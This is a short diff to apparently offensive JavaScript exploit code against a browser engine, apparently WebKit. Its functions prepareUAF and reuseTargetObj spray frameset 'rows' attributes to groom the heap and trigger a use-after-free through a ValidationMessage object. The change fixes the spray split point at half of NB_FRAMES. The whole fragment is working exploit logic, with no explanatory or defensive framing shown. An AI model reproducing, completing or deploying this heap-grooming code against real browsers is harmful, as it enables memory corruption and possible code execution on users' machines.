@@ -324,7 +324,7 @@ function reuseTargetObj() {
 	 * Free ValidationMessage neighboors.
 	 * SmallLine is freed -> SmallPage is cached
 	 */
-	for (let i = NB_FRAMES / 1 - 0x10; i < NB_FRAMES / 1 + 0x10; i++)
+	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
 		g_frames[i].setAttribute("rows", ',');
 
 	/* Get back target object */
@@ -395,14 +395,14 @@ function prepareUAF() {
 	div.appendChild(g_input);
 
 	/* First half spray */
-	for (let i = 0; i < NB_FRAMES / 1; i++)
+	for (let i = 0; i < NB_FRAMES / 2; i++)
 		g_frames[i].setAttribute("rows", g_rows1);
 
 	/* Instantiate target obj */
 	g_input.reportValidity();
 
 	/* ... and the second half */
-	for (let i = NB_FRAMES / 1; i < NB_FRAMES; i++)
+	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
 		g_frames[i].setAttribute("rows", g_rows2);
 
 	g_input.setAttribute("onfocus", "reuseTargetObj()");
